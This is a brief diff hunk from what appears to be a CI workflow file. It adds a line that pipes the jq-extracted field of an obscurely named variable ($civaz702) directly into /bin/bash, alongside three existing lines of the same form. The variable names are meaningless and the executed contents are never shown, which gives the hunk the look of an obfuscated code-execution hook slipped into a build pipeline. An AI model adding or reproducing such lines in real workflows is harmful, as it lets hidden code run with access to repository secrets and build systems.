@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$yva15" | jq -r .zt37237 | /bin/bash
           echo $dm11 | jq -r .u40 | /bin/bash
           echo $tsqtd3 | jq -r .duve4265 | /bin/bash
+          printf '%s' "$civaz702" | jq -r .u35 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
